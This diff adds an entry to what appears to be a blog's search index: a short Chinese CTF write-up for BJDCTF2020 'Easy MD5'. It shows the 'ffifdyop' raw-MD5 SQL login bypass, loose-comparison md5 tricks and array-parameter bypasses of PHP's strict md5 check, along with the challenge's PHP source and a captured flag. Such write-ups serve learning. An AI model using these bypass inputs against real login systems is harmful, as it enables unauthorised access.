@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>note-28</title>
+    <link href="/2025/04/17/note-28/"/>
+    <url>/2025/04/17/note-28/</url>
+    
+    <content type="html"><![CDATA[<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>在bp查看相应，看到：<br>hint: select * from ‘admin’ where password&#x3D;md5($pass,true)<br>试一下ffifdyop<br>返回的页面中有：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">$a = $GET[&#x27;a&#x27;];</span><br><span class="hljs-comment">$b = $_GET[&#x27;b&#x27;];</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="hljs-comment">    // wow, glzjin wants a girl friend.</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure><p>不是怎么都在求girlfriend,<br>这个我猜能用数组绕过</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">?a=r[]&amp;b=<span class="hljs-string">q[]</span><br>//不行<br>?a=<span class="hljs-string">&#x27;1&#x27;</span>&amp;b=<span class="hljs-number">1</span><br>//<span class="hljs-keyword">no</span><br></code></pre></td></tr></table></figure><p>那直接上网查md5加密后能弱等于的字符</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">?a=%271%27&amp;&amp;b=<span class="hljs-number">1</span><br><span class="hljs-comment">//ok</span><br></code></pre></td></tr></table></figure><p>返回</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个强不等于试一下’1’,1</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">param1=<span class="hljs-number">1</span><span class="hljs-variable">&amp;param2</span>=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-comment">//no</span><br><br>param1[]=<span class="hljs-number">1</span><span class="hljs-variable">&amp;param2</span>[]=<span class="hljs-number">2</span><br><span class="hljs-comment">// flag&#123;8277b79d-033f-4f57-a8dd-d74d41893128&#125; </span><br><span class="hljs-comment">//原来我刚才用的数组绕过是写错的啊😅</span><br><span class="hljs-comment">//试了一下，levels91.php和levell14.php，都能直接用数组绕过</span><br></code></pre></td></tr></table></figure><h2 id="ffifdyop"><a href="#ffifdyop" class="headerlink" title="ffifdyop"></a>ffifdyop</h2><p>sql中md5的万能密码<br><a href="https://blog.csdn.net/Jeff_12138/article/details/121847582">https://blog.csdn.net/Jeff_12138/article/details/121847582</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>note</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>note-27</title>
     <link href="/2025/04/17/note-27/"/>
     <url>/2025/04/17/note-27/</url>
